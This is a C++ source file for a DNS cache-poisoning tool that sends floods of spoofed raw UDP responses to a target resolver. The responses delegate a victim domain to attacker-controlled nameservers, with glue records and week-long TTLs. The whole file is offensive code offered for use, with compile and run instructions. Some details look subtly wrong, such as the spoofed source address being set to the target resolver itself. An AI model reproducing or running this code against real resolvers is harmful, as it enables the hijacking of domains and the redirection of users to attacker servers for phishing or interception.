// Compile: g++ -o ns_hijack ns_hijack.cpp
// Run: sudo ./ns_hijack <target_dns> <victim_domain> <malicious_ns> <ns_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class NSDelegationHijack {
private:
    std::string targetDNS, victimDomain, maliciousNS, nsIP;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    NSDelegationHijack(const std::string& dns, const std::string& domain,
                       const std::string& ns, const std::string& ip)
        : targetDNS(dns), victimDomain(domain), maliciousNS(ns), nsIP(ip) {}
    
    // Craft NS delegation response that delegates entire zone to attacker NS
    void hijackNS(uint16_t txid, uint16_t dstPort) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[1024];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        // Header: Response + Authoritative + No error
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8400);  // QR=1, AA=1
        *(uint16_t*)(dns + 4) = htons(1);  // QDCOUNT
        *(uint16_t*)(dns + 6) = htons(0);  // ANCOUNT
        *(uint16_t*)(dns + 8) = htons(2);  // NSCOUNT (2 NS records)
        *(uint16_t*)(dns + 10) = htons(2); // ARCOUNT (glue for both)
        
        int pos = 12;
        
        // Question
        pos += encodeName(dns + pos, victimDomain);
        *(uint16_t*)(dns + pos) = htons(2); pos += 2;  // NS query
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // IN
        
        // NS Record 1: maliciousNS
        pos += encodeName(dns + pos, victimDomain);
        *(uint16_t*)(dns + pos) = htons(2); pos += 2;       // Type NS
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;       // Class IN
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;  // TTL 1 week
        int ns1LenPos = pos;
        pos += 2;
        int ns1Start = pos;
        pos += encodeName(dns + pos, maliciousNS);
        *(uint16_t*)(dns + ns1LenPos) = htons(pos - ns1Start);
        
        // NS Record 2: another malicious NS (redundancy)
        pos += encodeName(dns + pos, victimDomain);
        *(uint16_t*)(dns + pos) = htons(2); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        int ns2LenPos = pos;
        pos += 2;
        int ns2Start = pos;
        pos += encodeName(dns + pos, "ns2." + maliciousNS);
        *(uint16_t*)(dns + ns2LenPos) = htons(pos - ns2Start);
        
        // Glue Record 1: A record for maliciousNS
        pos += encodeName(dns + pos, maliciousNS);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        struct in_addr addr;
        inet_aton(nsIP.c_str(), &addr);
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        // Glue Record 2: A record for ns2.maliciousNS (same IP)
        pos += encodeName(dns + pos, "ns2." + maliciousNS);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void triggerNSQuery() {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        
        char query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, victimDomain);
        *(uint16_t*)(query + pos) = htons(2); pos += 2;  // NS query
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, query, pos, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts = 10000) {
        std::cout << "[*] NS Delegation Hijack starting...\n";
        
        for (int i = 0; i < attempts; i++) {
            triggerNSQuery();
            
            // Flood responses
            for (int j = 0; j < 100; j++) {
                uint16_t txid = rand() & 0xFFFF;
                uint16_t port = 1024 + (rand() % 64000);
                hijackNS(txid, port);
            }
            
            if (i % 100 == 0) {
                std::cout << "[*] Attempt " << i << "/" << attempts << "\n";
            }
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_dns> <victim_domain> <malicious_ns> <ns_ip>\n";
        return 1;
    }
    srand(time(NULL));
    NSDelegationHijack hijack(argv[1], argv[2], argv[3], argv[4]);
    hijack.run(10000);
    return 0;
}
